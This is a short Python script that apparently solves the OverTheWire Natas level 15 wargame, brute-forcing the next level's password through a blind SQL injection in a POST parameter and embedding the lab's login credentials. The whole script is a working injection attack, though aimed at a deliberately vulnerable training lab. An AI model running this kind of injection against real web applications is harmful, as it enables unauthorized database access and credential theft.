import requests
import string

#First get together a list of possible characters. For this it comprises upper-/lowercase and digits 0-9
alphabet = list(string.ascii_letters) + list(string.digits)

#parameters for the request. Base URL, username and password for page authentication
url = 'http://natas15.natas.labs.overthewire.org/index.php'
usr = 'natas15'
passwd = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

#Strings to build the injection we'll input as a POST parameter. BINARY is to assure case sensitivity
query_beg = 'natas16" AND password LIKE BINARY "'
query_end = '%"; -- "'
password = ''

#Until we've got all 32 characters of the password...
while len(password) != 32:
    #...go through the possible characters and check to see if they return a positive result.
    for char in alphabet:
        #print the current working password. Carriage return and end='' so it doesn't move to a new line until correct character is hit
        print(password + char + '\r', end='')

        #process the post request, parameters passed through dictionary data type, auth passed as tuple
        response = requests.post(url, {'username': query_beg + password + char + query_end}, auth=(usr, passwd))

        #Existence of this string in response text indicates a correct character
        if 'This user exists.' in response.text:
            password += char
            print(password)
            break
